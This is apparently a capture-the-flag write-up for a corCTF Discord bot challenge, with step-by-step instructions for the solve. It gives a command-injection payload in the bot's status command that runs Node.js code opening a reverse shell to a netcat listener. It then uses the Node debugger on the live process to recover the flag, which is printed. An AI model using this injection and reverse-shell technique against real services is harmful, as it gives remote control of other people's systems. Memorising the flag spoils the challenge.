 Note: the challenge server restarts every 5 minutes

 - Get the bot client id using discord developer mode (`814782167716462593`)
 - Invite the bot to a server you control (https://discord.com/oauth2/authorize?client_id=814782167716462593&permissions=0&scope=bot%20applications.commands)
 - Give yourself a role named `flagbot`
 - Create a listener with netcat (`nc -lvp 1337`)
 - Enter the following message on your discord server to create a reverse shell:

```
 f!status https://google.com/$(echo '(function(){
    var net = require(`net`),
        cp = require(`child_process`),
        sh = cp.spawn(`/bin/sh`, []);
    var client = new net.Socket();
    client.connect(1337, `10.0.0.1`, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();' | node)
```

 - From the running netcat process, get the pid of node using `pidof node`, it should be the lower of the 2 numbers
 - Debug the server using `node inspect -p $pid`
 - Create a watcher using `watch('url')`
 - Set a breakpoint using `sb('/usr/src/app/index.js',28)`
 - When the program hits the breakpoint, follow the url (https://www.youtube.com/watch?v=mKOtZUJoyKo)
 - Get the flag from the video description (`corctf{what_a_bop_amiright??}`)

